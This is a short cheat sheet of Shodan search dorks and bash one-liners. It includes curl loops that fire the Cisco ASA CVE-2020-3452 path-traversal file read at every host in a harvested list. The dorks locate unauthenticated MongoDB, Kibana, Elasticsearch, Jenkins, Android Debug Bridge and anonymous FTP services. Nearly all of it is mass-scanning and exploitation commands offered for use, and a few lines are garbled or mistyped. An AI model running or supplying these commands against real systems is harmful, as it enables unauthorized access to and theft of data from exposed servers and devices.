
### Shodan Search Cisco ASA

```bash
shodan search Cisco ASA --fields ip_str --separator " " | awk '{print $1}'
```


### Curl Command for Cisco ASA File Read Vulnerability (CVE-2020-3452)

```bash
while read host; do curl -s -k "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSC0E%2b/portal_inc.lua&default-language&lang=…/"; done < <(cat microsoftvpn.json | awk '{print $1}')
```


### Curl Command for Cisco ASA File Read Vulnerability (CVE-2020-3452)

```bash
cat microsoftvpn.json | awk '{print $1}' | while read host; do curl -s -k "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSC0E%2b/portal_inc.lua&default-language&lang=../"; done
```


### HTTP Favicon Hash Search

```bash
http.favicon.hash:-335242539 "3992" -BIGIP
```


### Jenkins Dashboard HTML Component Search

```bash
html:"Dashboard Jenkins" http.component:"jenkins" put on -SHODAN
```


### Android Debug Bridge Device Port Search

```bash
"Android Debug Bridge" "Device" port:5555
```


### Jenkins Dashboard X-Jenkins Title and JSESSIONID Set-Cookie Search

```bash
"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard" 200 OK put on shodan
```


### SSH Fingerprint Search

```bash
 "dc:14:de:8e:d7:c1:15:43:23:82:25:81:d2:59:e8:c0" --fields ip_str --separator " "
```


### Fully Open MongoDB Search

```bash
 "MongoDB Server Information" "metrics" "Set-Cookie: mongo-express=" "200 OK" port:27017 -authentication
```


### Kibana Dashboard without Authentication Search

```bash
kibana content-legth:217
```


### Elastic Search Port 9200 and JSON Search

```bash
port:9200 json port:"9200" all:elastic port:"9200" all:"elastic indices"
```


### FTP Server Allowing Anonymous Access Search

```bash
"220" "230 Login successful." port:21
```
